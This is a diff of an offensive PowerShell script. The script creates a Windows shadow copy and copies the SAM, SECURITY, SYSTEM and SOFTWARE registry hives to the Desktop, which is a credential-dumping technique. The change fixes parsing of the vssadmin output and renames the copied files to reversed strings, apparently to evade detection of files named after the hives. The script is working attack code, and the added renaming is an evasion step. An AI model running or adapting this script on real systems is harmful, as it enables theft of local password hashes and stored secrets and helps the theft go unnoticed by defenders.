@@ -16,8 +16,8 @@ Write-Output "[+] Creating shadow copy"
 wmic shadowcopy call create Volume='C:\' > $null 2>&1
 
 # Get scadow copy ID and Path
-$shadowCopyID = (vssadmin list shadows | Select-String -Pattern "Shadow Copy ID:" | Select-Object -Last 1).ToString().Split(': ')[1].Trim()
-$shadowCopyPath = (vssadmin list shadows | Select-String -Pattern "Shadow Copy Volume:" | Select-Object -Last 1).ToString().Split(': ')[1].Trim()
+$shadowCopyID = (vssadmin list shadows | Select-String -Pattern "Shadow Copy ID:" | Select-Object -Last 1).ToString().Split(':')[1].Trim()
+$shadowCopyPath = (vssadmin list shadows | Select-String -Pattern "Shadow Copy Volume:" | Select-Object -Last 1).ToString().Split(':')[1].Trim()
 
 Write-Output "[*] ShadowCopy UUID: $shadowCopyID"
 Write-Output "[*] ShadowCopy ID: $shadowCopyPath"
@@ -33,13 +33,13 @@ $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
 
 # Copy LSA files on Desktop
 Write-Output "[+] Copying SAM..."
-copy "$mountPoint\windows\system32\config\sam" "$desktopPath\${timestamp}_sam"
+copy "$mountPoint\windows\system32\config\sam" "$desktopPath\${timestamp}_mas"
 Write-Output "[+] Copying SECURITY..."
-copy "$mountPoint\windows\system32\config\security" "$desktopPath\${timestamp}_security"
+copy "$mountPoint\windows\system32\config\security" "$desktopPath\${timestamp}_ytiruces"
 Write-Output "[+] Copying SYSTEM..."
-copy "$mountPoint\windows\system32\config\system" "$desktopPath\${timestamp}_system"
+copy "$mountPoint\windows\system32\config\system" "$desktopPath\${timestamp}_metsys"
 Write-Output "[+] Copying SOFTWARE..."
-copy "$mountPoint\windows\system32\config\software" "$desktopPath\${timestamp}_software"
+copy "$mountPoint\windows\system32\config\software" "$desktopPath\${timestamp}_erawtfos"
 
 # Deletes mounted folder
 Write-Output "[-] Deleting symlink"
